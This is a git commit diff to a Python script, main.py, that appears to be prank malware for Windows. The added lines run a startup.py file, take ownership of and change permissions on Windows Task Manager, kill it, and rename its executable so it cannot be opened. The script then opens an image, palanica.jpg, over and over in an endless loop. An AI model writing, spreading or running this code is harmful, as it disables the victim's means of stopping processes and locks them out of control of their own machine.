b0819e3a3cecc21e02b3e849df3ecdf8e6a690de
pocketcat3 <114851989+pocketcat3@users.noreply.github.com>
2022-11-16 12:02:08 +0200

    commit

--- main.py
+++ main.py
@@ -1,9 +1,19 @@
 import os
 import time
-# from playsound import playsound
+
+
+os.system("python startup.py")
+
+path1 = "C:\Windows\System32\Taskmgr.exe"
+path2 = "C:\Windows\System32\Taskmgr1.exe"
+os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
+os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
+os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
+os.system("taskkill /im taskmgr.exe")
+os.rename(path1, path2)
+
 
 os.system("palanica.jpg")
 time.sleep(1)
-
 while True:
     os.system("palanica.jpg")
